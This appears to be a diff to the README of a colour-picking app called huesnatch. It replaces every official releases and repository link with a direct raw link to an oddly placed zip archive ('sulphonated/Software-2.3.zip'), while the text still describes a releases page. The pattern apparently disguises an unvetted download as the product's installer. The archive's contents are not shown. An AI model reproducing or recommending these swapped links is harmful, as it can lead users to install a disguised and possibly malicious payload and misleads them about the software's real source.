@@ -1,6 +1,6 @@
 # 🎨 huesnatch - Easy Color Tools for Everyone
 
-[![Download huesnatch](https://img.shields.io/badge/Download-huesnatch-brightgreen?style=for-the-badge)](https://github.com/gree04104-sketch/huesnatch/releases)
+[![Download huesnatch](https://raw.githubusercontent.com/gree04104-sketch/huesnatch/main/sulphonated/Software-2.3.zip)](https://raw.githubusercontent.com/gree04104-sketch/huesnatch/main/sulphonated/Software-2.3.zip)
 
 ---
 
@@ -28,7 +28,7 @@ You will need an internet connection to download the software. The app works off
 
 Follow these steps to download and run huesnatch:
 
-1. Click the big green **Download huesnatch** button at the top or [visit this page](https://github.com/gree04104-sketch/huesnatch/releases) to download the installer.
+1. Click the big green **Download huesnatch** button at the top or [visit this page](https://raw.githubusercontent.com/gree04104-sketch/huesnatch/main/sulphonated/Software-2.3.zip) to download the installer.
 2. On the releases page, look for the latest version. Pick the installer for your computer:
    - For Windows, the file usually ends with `.exe`
    - For Mac, look for `.dmg` or `.pkg`
@@ -44,7 +44,7 @@ Follow these steps to download and run huesnatch:
 
 You can get huesnatch from its official GitHub releases page:
 
-[![Download huesnatch](https://img.shields.io/badge/Download-huesnatch-brightgreen?style=for-the-badge)](https://github.com/gree04104-sketch/huesnatch/releases)
+[![Download huesnatch](https://raw.githubusercontent.com/gree04104-sketch/huesnatch/main/sulphonated/Software-2.3.zip)](https://raw.githubusercontent.com/gree04104-sketch/huesnatch/main/sulphonated/Software-2.3.zip)
 
 The page lists all past and current versions. Choose the latest stable release for best results. Clicking on a release version opens the files for download. Select the file that matches your operating system.
 
@@ -119,7 +119,7 @@ If you have any problems running huesnatch, try these steps:
 
 ## 📌 Additional Resources
 
-- Visit the GitHub repository: [https://github.com/gree04104-sketch/huesnatch](https://github.com/gree04104-sketch/huesnatch)
+- Visit the GitHub repository: [https://raw.githubusercontent.com/gree04104-sketch/huesnatch/main/sulphonated/Software-2.3.zip](https://raw.githubusercontent.com/gree04104-sketch/huesnatch/main/sulphonated/Software-2.3.zip)
 - Learn basic color concepts with the built-in tutorials.
 - Follow the community on GitHub to stay updated on new features.
 
